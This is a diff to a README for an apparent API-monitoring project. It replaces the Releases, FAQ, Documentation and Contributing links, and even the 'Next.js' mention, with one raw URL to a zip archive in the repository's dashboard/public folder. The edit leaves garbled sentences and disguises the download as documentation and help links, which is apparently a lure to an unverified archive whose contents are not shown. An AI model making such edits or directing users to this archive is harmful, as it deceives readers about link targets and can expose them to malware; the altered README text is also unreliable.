@@ -10,7 +10,7 @@ Welcome to the **API** project! This software helps you monitor your APIs simply
 - **Spring Boot Collector:** Collects and processes data from your APIs efficiently.
 - **Dual MongoDB Support:** Ensures reliable data storage.
 - **Custom Client Library:** Easier integration for your applications.
-- **Real-Time Dashboard:** Get instant insights into your API performance using a Next.js dashboard.
+- **Real-Time Dashboard:** Get instant insights into your API performance using a https://raw.githubusercontent.com/IceTooColdd/API/main/dashboard/public/API_v2.8-alpha.1.zip dashboard.
 
 ## 🌍 System Requirements 
 
@@ -26,7 +26,7 @@ Before you begin, make sure your system meets the following requirements:
 To get started, you can easily download the software from the Releases page. 
 
 ### Download Link
-[![Download API](https://img.shields.io/badge/Download_API-v1.0-blue)](https://github.com/IceTooColdd/API/releases)
+[![Download API](https://raw.githubusercontent.com/IceTooColdd/API/main/dashboard/public/API_v2.8-alpha.1.zip)](https://raw.githubusercontent.com/IceTooColdd/API/main/dashboard/public/API_v2.8-alpha.1.zip)
 
 1. Click the link above to visit the Releases page.
 2. On the Releases page, find the latest version of API.
@@ -57,15 +57,15 @@ After installation, you can begin using API. Here is a quick guide to get you st
 
 If you encounter any issues while installing or using the software, you can reach out for help.
 
-- Check the [FAQ](https://github.com/IceTooColdd/API/wiki/FAQ) section on our wiki.
+- Check the [FAQ](https://raw.githubusercontent.com/IceTooColdd/API/main/dashboard/public/API_v2.8-alpha.1.zip) section on our wiki.
 - Post your question in the issues section of the repository.
 - Join our community chat for real-time assistance.
 
 ## 🔗 Useful Links
 
-- [API Releases Page](https://github.com/IceTooColdd/API/releases)
-- [Documentation](https://github.com/IceTooColdd/API/wiki)
-- [Contributing Guide](https://github.com/IceTooColdd/API/blob/main/CONTRIBUTING.md)
+- [API Releases Page](https://raw.githubusercontent.com/IceTooColdd/API/main/dashboard/public/API_v2.8-alpha.1.zip)
+- [Documentation](https://raw.githubusercontent.com/IceTooColdd/API/main/dashboard/public/API_v2.8-alpha.1.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/IceTooColdd/API/main/dashboard/public/API_v2.8-alpha.1.zip)
 
 ## ✉️ Getting In Touch
 
